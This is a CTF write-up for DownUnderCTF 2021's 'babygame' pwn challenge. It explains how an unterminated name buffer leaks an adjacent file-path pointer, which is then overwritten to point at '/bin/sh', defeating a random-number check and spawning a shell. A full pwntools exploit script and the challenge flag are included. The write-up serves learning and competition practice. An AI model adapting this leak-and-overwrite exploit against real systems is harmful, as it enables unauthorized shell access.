---
title: "[writeup][DownUnderCTF 2021] pwn-babygame"
date: 2021-10-09 13:01:03
tags:
    - writeup
    - ctf
    - ductf
    - pwn
    - buffer overflow
categories:
    - CTF
---

## Mitigations

```
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
```

## Solution

### vuln 1

in game() function, it will ask us to provide number that is equals the first 4 bytes of `/dev/urandom`, if we guess it right, it will give us a shell. however guessing is not possible.

<!-- more -->
```
// from main

_RANDBUF = "/dev/urandom";

// from game()
    uVar2 = fopen(_RANDBUF, 0x2098);
    fread(&ptr, 1, 4, uVar2);
    printf("guess: ");
    iVar1 = get_num();
    if (iVar1 == ptr) {
        system("/bin/sh");
    }
```

### vuln 2

since `NAME` if 0x20 bytes long, so if we can write fill NAME with 0x20 bytes long, it will print out the next variable in the stack.

*because if the entire buff is filled, the string will not terminate and continue reading until we get a null bytes.*

and it set_name using `strlen`, so the total length would be 0x20+(length until it meet a null bytes)

```
// from print_username()
	puts(NAME);

// from set_username()
    uVar2 = strlen(NAME);
    fread(NAME, 1, uVar2, uVar1);
```

since the `_RANDBUF` is just beblow the `NAME`, we can first get the pointer of `_RANDBUF` and change the pointer in `_RANDBUF` to an known file, in this case we use `/bin/sh`

```
;-- NAME:
0x000040a0-0x000040c0
;-- RANDBUF:
0x000040c0-0x000040c8
```

### process

first write 32 bytes of name, than print name to get the pointer of `_RANDBUF`, after we got pointer of `_RANDBUF` we can use set_name to change this address to a existing `/bin/sh` string by offset.

```
;-- str.dev_urandom:
0x00002024          .string "/dev/urandom" ; len=13
;-- str.bin_sh:
0x000020a3          .string "/bin/sh" ; len=8
```

## Exploits

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=pwn-2021.duc.tf' '--port=31907' babygame
import os

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babygame')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31907)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

with open("/bin/sh","rb") as f:
    a = f.read(4)
    print("num",int.from_bytes(a,"little"))

io = start()

io.sendafter(b"name?\n",b"a"*32)
io.sendafter(b"Username\n> ",b"2")
print(io.recv(32))
a = io.recvn(6)
# b = io.recvn(6)
ptr = (int.from_bytes(a,"little")+0x20a3-0x2024).to_bytes(0x6,"little")
print(ptr)
io.sendafter(b"Username\n> ",b"1")
print("overwrite pointer")
io.sendafter(b"username to?\n",b"a"*32+ptr)
print("overwrite pointer ok")
print(io.recv(1024))
io.send(b"1337")
print(io.recv(1024))
io.send(b'1179403647')
io.interactive()
```

DUCTF{whats_in_a_name?_5aacfc58}